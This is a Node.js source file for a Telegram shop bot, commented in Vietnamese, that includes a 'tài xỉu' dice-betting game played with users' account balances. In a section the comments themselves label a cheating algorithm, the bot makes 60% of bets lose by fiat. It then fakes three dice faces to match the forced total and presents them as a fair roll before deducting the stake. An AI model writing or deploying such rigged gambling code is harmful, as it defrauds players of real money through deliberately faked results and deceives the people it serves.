const productService = require('../services/productService');
const messages = require('../utils/messages');
const { quantityKeyboard, productListKeyboard, formatPrice } = require('../utils/keyboard');
const config = require('../config');
const userService = require('../services/userService');
const { Markup } = require('telegraf');

module.exports = (bot) => {
    // 1. Xử lý chọn sản phẩm
    bot.action(/^product_(\d+)$/, async (ctx) => {
        const productId = parseInt(ctx.match[1]);
        const product = await productService.getById(productId);
        if (!product) return ctx.answerCbQuery('❌ Sản phẩm không tồn tại');
        await ctx.answerCbQuery();

        if (product.contact_only) {
            const buttons = [];
            const adminUsername = config.SUPPORT_CONTACT.replace('@', '');
            buttons.push([Markup.button.url('💬 Liên hệ mua', `https://t.me/${adminUsername}`)]);
            if (product.contact_url) buttons.push([Markup.button.url('📱 Hotline Zalo 24/7', product.contact_url)]);
            buttons.push([Markup.button.callback('↩️ Quay lại', 'refresh_products')]);
            return ctx.replyWithHTML(messages.contactOnly(product), Markup.inlineKeyboard(buttons));
        }

        const availableStock = product.display_stock || product.stock_count;
        if (availableStock === 0) return ctx.reply(messages.noStock);
        const maxQty = Math.min(availableStock, 10);
        ctx.replyWithHTML(messages.selectQuantity(product), quantityKeyboard(productId, maxQty));
    });

    // 2. Khi bấm nút TÀI hoặc XỈU
    bot.action(/^bet_(tai|xiu)$/, async (ctx) => {
        const choice = ctx.match[1];
        await ctx.answerCbQuery();
        
        ctx.session = ctx.session || {};
        ctx.session.betChoice = choice;

        const choiceName = choice === 'tai' ? '🔴 TÀI' : '🔵 XỈU';
        
        ctx.replyWithHTML(
            `Bạn đã chọn cược <b>${choiceName}</b>.\n\n` +
            `💰 Vui lòng nhập <b>số tiền</b> bạn muốn cược (Ví dụ: 10000):\n\n` +
            `Gõ /cancel để hủy.`
        );
    });

    // 3. Hủy đặt cược
    bot.command('cancel', (ctx) => {
        if (ctx.session && ctx.session.betChoice) {
            ctx.session.betChoice = null;
            return ctx.reply('❌ Đã hủy đặt cược.');
        }
    });

    // 4. Bắt sự kiện người chơi nhập số tiền
    bot.on('text', async (ctx, next) => {
        if (!ctx.session || !ctx.session.betChoice) return next();

        const text = ctx.message.text.trim();
        if (text.startsWith('/')) return next();

        const amount = parseInt(text);
        if (isNaN(amount) || amount <= 0) {
            return ctx.reply('❌ Số tiền không hợp lệ. Vui lòng nhập lại (Ví dụ: 10000).');
        }

        const user = await userService.get(ctx.from.id);
        const userBalance = Number(user ? user.balance : 0);

        if (!user || userBalance < amount) {
            return ctx.reply(`❌ Số dư của bạn không đủ. Số dư hiện tại: ${formatPrice(userBalance)}`);
        }

        const choice = ctx.session.betChoice;
        const choiceName = choice === 'tai' ? 'TÀI' : 'XỈU';
        
        ctx.session.betChoice = null;

        // ═══════════════════════════════════════
        // 5. THUẬT TOÁN GIAN LẬN & HIỆU ỨNG
        // ═══════════════════════════════════════
        await ctx.replyWithHTML('🎲 <b>Đang lắc xúc xắc...</b>');

        const diceEmojis = ['', '⚀', '⚁', '⚂', '⚃', '⚄', '⚅'];

        // Quyết định xem người chơi có bị ép thua không
        // Math.random() < 0.6 nghĩa là 60% người chơi sẽ bị ép thua (bạn có thể đổi số 0.6 này)
        const isForcedLose = Math.random() < 0.6; 
        
        let finalTotal;
        let finalResult;

        if (isForcedLose) {
            // Ép thua: Tạo ra kết quả ngược lại với lựa chọn của người chơi
            if (choice === 'tai') {
                finalTotal = Math.floor(Math.random() * 8) + 3; // Random từ 3 đến 10 (Xỉu)
            } else {
                finalTotal = Math.floor(Math.random() * 8) + 11; // Random từ 11 đến 18 (Tài)
            }
        } else {
            // Cho thắng: Tạo ra kết quả trùng với lựa chọn của người chơi
            if (choice === 'tai') {
                finalTotal = Math.floor(Math.random() * 8) + 11; // Random từ 11 đến 18 (Tài)
            } else {
                finalTotal = Math.floor(Math.random() * 8) + 3; // Random từ 3 đến 10 (Xỉu)
            }
        }

        // Tự tạo ra 3 con số ngẫu nhiên sao cho tổng = finalTotal
        let d1, d2, d3;
        do {
            d1 = Math.floor(Math.random() * 6) + 1;
            d2 = Math.floor(Math.random() * 6) + 1;
            d3 = Math.floor(Math.random() * 6) + 1;
        } while (d1 + d2 + d3 !== finalTotal);

        // Gửi tin nhắn ảnh xúc xắc (dùng emoji để đảm bảo khớp 100% với tổng điểm)
        const finalMsg = 
            `🎲 <b>KẾT QUẢ LẮC XÚC XẮC</b> 🎲\n\n` +
            `${diceEmojis[d1]}  ${diceEmojis[d2]}  ${diceEmojis[d3]}\n\n` +
            `🔢 Tổng điểm: <b>${finalTotal}</b> => <b>${finalTotal >= 11 ? 'TÀI' : 'XỈU'}</b>\n\n` +
            `Bạn đã cược: <b>${choiceName}</b> (${formatPrice(amount)})\n`;

        await ctx.replyWithHTML(finalMsg);

        const resultName = finalTotal >= 11 ? 'TÀI' : 'XỈU';

        // ═══════════════════════════════════════
        // 6. XỬ LÝ THẮNG / THUA
        // ═══════════════════════════════════════
        
        await userService.deductBalance(ctx.from.id, amount);

        // Kiểm tra xem người chơi thắng hay thua dựa trên kết quả đã ép
        const isWin = (choice === 'tai' && finalTotal >= 11) || (choice === 'xiu' && finalTotal < 11);

        if (isWin) {
            // THẮNG
            const winnings = amount; 
            await userService.addBalance(ctx.from.id, amount + winnings); 
            
            const updatedUser = await userService.get(ctx.from.id);
            const newBalance = Number(updatedUser.balance);
            
            await ctx.replyWithHTML(
                `\n🎉 <b>CHÚC MỪNG! BẠN ĐÃ THẮNG</b>\n` +
                `💰 Tiền thắng: <b>+${formatPrice(winnings)}</b>\n` +
                `💳 Số dư mới: <b>${formatPrice(newBalance)}</b>`
            );

            // Gửi Admin
            try {
                const adminMsg = 
                    `🎉 <b>NGƯỜI CHƠI THẮNG</b>\n\n` +
                    `👤 Khách: <b>${ctx.from.first_name}</b> (<code>${ctx.from.id}</code>)\n` +
                    `🎲 Cược: <b>${choiceName}</b> | Kết quả: <b>${resultName}</b> (${finalTotal} điểm)\n` +
                    `💰 Tiền cược: <b>${formatPrice(amount)}</b>\n` +
                    `💵 Số dư mới: <b>${formatPrice(newBalance)}</b>`;
                await bot.telegram.sendMessage(config.ADMIN_ID, adminMsg, { parse_mode: 'HTML' });
            } catch (e) { console.error(e); }

        } else {
            // THUA
            const updatedUser = await userService.get(ctx.from.id);
            const newBalance = Number(updatedUser.balance);
            
            await ctx.replyWithHTML(
                `\n😢 <b>RẤT TIẾC! BẠN ĐÃ THUA</b>\n` +
                `💸 Tiền mất: <b>-${formatPrice(amount)}</b>\n` +
                `💳 Số dư mới: <b>${formatPrice(newBalance)}</b>`
            );

            // Gửi Admin
            try {
                const adminMsg = 
                    `😢 <b>NGƯỜI CHƠI THUA</b>\n\n` +
                    `👤 Khách: <b>${ctx.from.first_name}</b> (<code>${ctx.from.id}</code>)\n` +
                    `🎲 Cược: <b>${choiceName}</b> | Kết quả: <b>${resultName}</b> (${finalTotal} điểm)\n` +
                    `💸 Tiền mất: <b>${formatPrice(amount)}</b>\n` +
                    `💵 Số dư mới: <b>${formatPrice(newBalance)}</b>`;
                await bot.telegram.sendMessage(config.ADMIN_ID, adminMsg, { parse_mode: 'HTML' });
            } catch (e) { console.error(e); }
        }

        // Gửi lại menu chơi
        ctx.reply('Chơi tiếp?', productListKeyboard([]));
    });
};